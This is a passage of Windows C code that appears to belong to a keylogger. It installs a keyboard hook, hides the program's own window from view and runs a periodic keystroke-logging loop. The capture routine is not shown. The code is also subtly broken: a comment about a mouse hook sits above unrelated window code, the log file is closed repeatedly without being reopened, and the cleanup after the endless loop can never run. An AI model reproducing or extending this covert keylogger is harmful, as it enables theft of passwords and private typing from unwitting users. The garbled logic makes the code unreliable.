    if (!keyboardHook) {
        printf("Failed to install keyboard hook!\n");
        return 1;
    }

    // Enable the mouse hook to prevent highlighting
    HWND hwnd = GetForegroundWindow();
    RECT windowRect;
    GetWindowRect(hwnd, &windowRect);
    ShowWindow(hwnd, SW_HIDE);
    Sleep(100);

    // Start the logging loop
    time_t lastTime = time(0);
    while (true) {
        Sleep(1); // Prevents high CPU usage
        time_t currentTime = time(0);
        if (currentTime - lastTime > 5) { // Log every 5 seconds
            lastTime = currentTime;
            // Save any pending keystroke
            if (file) {
                fclose(file);
            }
        }
    }

    // Remove the hook
    UnhookWindowsHook(keyboardHook);
    printf("Keyboard hook removed.\n");
    return 0;
}

// Main program
